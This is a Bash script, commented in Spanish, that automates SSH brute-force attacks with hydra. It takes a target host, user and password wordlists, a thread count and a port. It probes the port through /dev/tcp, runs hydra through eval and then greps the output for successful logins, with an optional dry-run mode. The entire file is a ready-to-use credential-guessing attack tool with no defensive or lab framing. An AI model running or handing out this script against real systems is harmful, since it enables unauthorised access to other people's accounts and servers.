#!/usr/bin/env bash
set -euo pipefail

# Defecto 
PORT=22
THREADS=4
USERS="common/wordlists/users.txt"
PASSWORDS="common/wordlists/passwords.txt"
TARGET=""
DRYRUN=0
OUTDIR="output"
mkdir -p "$OUTDIR"

usage() {
  echo "Uso: $0 -t <target> [-U users.txt] [-P pass.txt] [-T hilos] [-p puerto] [-n]"
  echo ""
  echo "Ejemplo:"
  echo "  $0 -t 192.168.1.10 -U myusers.txt -P rockyou.txt -T 6"
  echo ""
  echo "Opciones:"
  echo "  -t TARGET     IP o dominio objetivo (obligatorio)"
  echo "  -U USERS      Wordlist de usuarios (default: $USERS)"
  echo "  -P PASSWORDS  Wordlist de contraseñas (default: $PASSWORDS)"
  echo "  -T THREADS    Número de hilos (default: $THREADS)"
  echo "  -p PORT       Puerto SSH (default: $PORT)"
  echo "  -n            Dry-run (no ejecuta, solo muestra comando)"
  exit 1
}

while getopts ":t:U:P:T:p:n" opt; do
  case "$opt" in
    t) TARGET="$OPTARG" ;;
    U) USERS="$OPTARG" ;;
    P) PASSWORDS="$OPTARG" ;;
    T) THREADS="$OPTARG" ;;
    p) PORT="$OPTARG" ;;
    n) DRYRUN=1 ;;
    *) usage ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[-] Debes especificar -t <target>"; usage; }

# Dependencias
command -v hydra >/dev/null 2>&1 || { echo "[-] hydra no está instalado"; exit 1; }
[[ ! -f "$USERS" ]] && { echo "[-] Wordlist de usuarios no encontrada: $USERS"; exit 1; }
[[ ! -f "$PASSWORDS" ]] && { echo "[-] Wordlist de contraseñas no encontrada: $PASSWORDS"; exit 1; }

# validacion de puerto 
echo "[*] Verificando si el puerto $PORT está abierto en $TARGET..."
if ! timeout 3 bash -c "</dev/tcp/$TARGET/$PORT" 2>/dev/null; then
  echo "[-] El puerto $PORT en $TARGET no está abierto o está filtrado."
  exit 1
fi

# Comando 
TIMESTAMP=$(date +%s)
OUTFILE="$OUTDIR/ssh_brute_${TARGET}_${TIMESTAMP}.txt"

CMD="hydra -L \"$USERS\" -P \"$PASSWORDS\" -t $THREADS -s $PORT ssh://$TARGET -o \"$OUTFILE\""

echo "========================================"
echo "[*] Iniciando fuerza bruta SSH"
echo " Target     : $TARGET"
echo " Puerto     : $PORT"
echo " Usuarios   : $USERS"
echo " Passwords  : $PASSWORDS"
echo " Hilos      : $THREADS"
[[ $DRYRUN -eq 1 ]] && echo " Modo       : DRY-RUN"
echo "========================================"

if [[ $DRYRUN -eq 1 ]]; then
  echo "[cmd] $CMD"
else
  eval $CMD
  echo "[✓] Fuerza bruta completada. Resultados guardados en: $OUTFILE"
  echo
  echo "[*] Logins exitosos encontrados:"
  grep "login:" "$OUTFILE" || echo "[-] Ningún login exitoso."
fi

